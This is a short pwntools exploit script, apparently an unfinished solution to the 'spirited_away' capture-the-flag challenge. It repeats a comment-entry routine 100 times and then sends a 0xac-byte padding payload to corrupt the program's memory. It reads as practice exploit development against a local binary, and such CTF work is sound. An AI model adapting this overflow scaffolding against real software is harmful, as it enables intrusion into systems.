from pwn import *

#io = process('./spirited_away', env={"LD_PRELOAD":"./libc_32.so.6"})
io = process('./spirited_away')


def new_comment(name, age, reason, comment):
    print(io.recvuntil(b'Please enter your name: '))
    io.sendline(name)
    print(io.recvuntil(b'Please enter your age: '))
    io.sendline(str(age))
    print(io.recvuntil(b'Why did you came to see this movie? '))
    io.sendline(reason)
    print(io.recvuntil(b'Please enter your comment: '))
    io.sendline(comment)
    print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
    io.sendline(b'y')


for i in range(100):
	new_comment(b'', b'+', b'', b'')

payload = b'A'*0xac
new_comment(b'A', b'+', b'B', payload)
